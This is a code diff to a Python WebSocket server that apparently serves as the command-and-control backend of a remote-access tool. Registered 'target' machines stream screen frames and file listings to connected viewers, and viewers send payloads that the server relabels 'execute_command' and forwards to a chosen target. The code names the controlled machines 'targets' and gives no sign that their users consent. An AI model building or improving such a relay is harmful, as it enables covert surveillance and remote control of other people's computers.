@@ -174,33 +174,61 @@ def status_page():
 
 # Wrap the Flask app so the async Uvicorn server can speak to it
 wsgi_middleware = WSGIMiddleware(flask_app)
+# (Keep your Flask and a2wsgi imports here as well)
 
+logging.basicConfig(level=logging.INFO)
 
 # ==========================================
-# 2. YOUR EXACT WEBSOCKET LOGIC
+# CUSTOM USER CLASSES
 # ==========================================
-live_targets = {}      # { "Target-PC": send_coroutine }
-connected_viewers = set()  # { send_coroutine, send_coroutine }
+class LiveUser:
+    """Represents an active target machine streaming data."""
+    def __init__(self, name, send_coroutine):
+        self.name = name
+        self.send = send_coroutine  # Cache the underlying ASGI pipe
+        self.connected_at = asyncio.get_event_loop().time()
+
+class ViewerUser:
+    """Represents an active dashboard instance listening to streams."""
+    def __init__(self, send_coroutine):
+        self.send = send_coroutine  # Cache the underlying ASGI pipe
+        self.pending_commands = []
+        self.connected_at = asyncio.get_event_loop().time()
+
+
+# Global states mapped directly by your classes
+live_targets = {}        # { "Target-PC": LiveUser }
+connected_viewers = set()    # { ViewerUser, ViewerUser }
 
 async def broadcast_to_viewers(payload_dict):
+    """Iterates through active ViewerUser objects to forward system payloads."""
     if not connected_viewers:
         return
     message = {
         "type": "websocket.send",
         "text": json.dumps(payload_dict)
     }
-    await asyncio.gather(*[viewer(message) for viewer in list(connected_viewers)], return_exceptions=True)
+    # Safely unpack the inner .send function from each ViewerUser object
+    await asyncio.gather(
+        *[viewer.send(message) for viewer in list(connected_viewers)], 
+        return_exceptions=True
+    )
 
+
+# ==========================================
+# 2. UPDATED WEBSOCKET LOGIC
+# ==========================================
 async def websocket_handler(scope, receive, send):
     await send({'type': 'websocket.accept'})
-    client_type = None
-    target_name = None
+    
+    current_user_instance = None
+    client_type = None 
     
     try:
         while True:
             try:
-                message = await asyncio.wait_for(receive(), timeout=15.0)
-            except asyncio.TimeoutError:
+                message = await receive()
+            except Exception as e:
                 break
             
             if message['type'] == 'websocket.disconnect':
@@ -210,41 +238,85 @@ async def websocket_handler(scope, receive, send):
                 payload = json.loads(message['text'])
                 msg_type = payload.get("type")
                 
+                # --- VIEWERS HANDSHAKE ---
                 if msg_type == "register_viewer":
                     client_type = "viewer"
-                    connected_viewers.add(send)
+                    current_user_instance = ViewerUser(send_coroutine=send)
+                    connected_viewers.add(current_user_instance)
+                    
+                    # Immediately send current list of online computer name keys
                     await send({
                         'type': 'websocket.send',
                         'text': json.dumps({"type": "list", "data": list(live_targets.keys())})
                     })
                 
+                # --- TARGETS HANDSHAKE ---
                 elif msg_type == "register_target":
                     client_type = "target"
                     target_name = payload.get("COMPUTERNAME", "Unknown-Target")
-                    live_targets[target_name] = send
+                    
+                    current_user_instance = LiveUser(name=target_name, send_coroutine=send)
+                    live_targets[target_name] = current_user_instance
+                    
+                    # Broadcast refreshed target list to everyone connected
                     await broadcast_to_viewers({"type": "list", "data": list(live_targets.keys())})
                 
+                # --- FRAME STREAM ROUTER (FIXED) ---
                 elif msg_type == "stream_frame" and client_type == "target":
                     frame_data = payload.get("frame")
-                    await broadcast_to_viewers({
-                        "type": "frame",
-                        "user": target_name,
-                        "frame": frame_data
-                    })
+                    
+                    if current_user_instance:
+                        # CRITICAL FIX: Explicitly pass the string target name 
+                        await broadcast_to_viewers({
+                            "type": "frame",
+                            "user": current_user_instance.name, 
+                            "frame": frame_data
+                        })
+                        
                     await send({
                         'type': 'websocket.send',
                         'text': json.dumps({"status": "OK"})
                     })
+                
+                # --- VIEWER COMMAND ROUTER ---
+                elif msg_type == "viewer_frame" and client_type == "viewer":
+                    target_recipient = payload.get("target")
+                    
+                    if target_recipient in live_targets:
+                        target_instance = live_targets[target_recipient]
+                        
+                        # Forward the complete context dictionary down
+                        payload["type"] = "execute_command"
+                        await target_instance.send({
+                            "type": "websocket.send",
+                            "text": json.dumps(payload)
+                        })
+                    
+                    await send({
+                        'type': 'websocket.send',
+                        'text': json.dumps({"status": "OK"})
+                    })
+
+                # --- TARGET FILE MANAGER RESPONSE ---
+                elif msg_type == "file_list" and client_type == "target":
+                    if current_user_instance:
+                        await broadcast_to_viewers({
+                            "type": "file_list",
+                            "user": current_user_instance.name,
+                            "path": payload.get("path", ""),
+                            "files": payload.get("files", [])
+                        })
                     
     except Exception as e:
         logging.error(f"WebSocket Error: {e}")
     finally:
-        if client_type == "viewer" and send in connected_viewers:
-            connected_viewers.remove(send)
-        elif client_type == "target" and target_name in live_targets:
-            del live_targets[target_name]
+        if client_type == "viewer" and current_user_instance in connected_viewers:
+            connected_viewers.remove(current_user_instance)
+            
+        elif client_type == "target" and current_user_instance:
+            if current_user_instance.name in live_targets:
+                del live_targets[current_user_instance.name]
             await broadcast_to_viewers({"type": "list", "data": list(live_targets.keys())})
-
 
 # ==========================================
 # 3. CENTRAL ROUTER (THE APP ENTRY POINT)
@@ -267,4 +339,11 @@ async def app(scope, receive, send):
 
 if __name__ == "__main__":
     port = int(os.environ.get("PORT", 10000))
-    uvicorn.run(app, host="0.0.0.0", port=port, log_level="info")
+    uvicorn.run(
+        app, 
+        host="0.0.0.0", 
+        port=port, 
+        log_level="info",
+        ws_ping_interval=20.0,  # Sends a background ping every 20 seconds
+        ws_ping_timeout=10.0     # Gives clients 10 seconds to respond before dropping them
+    )
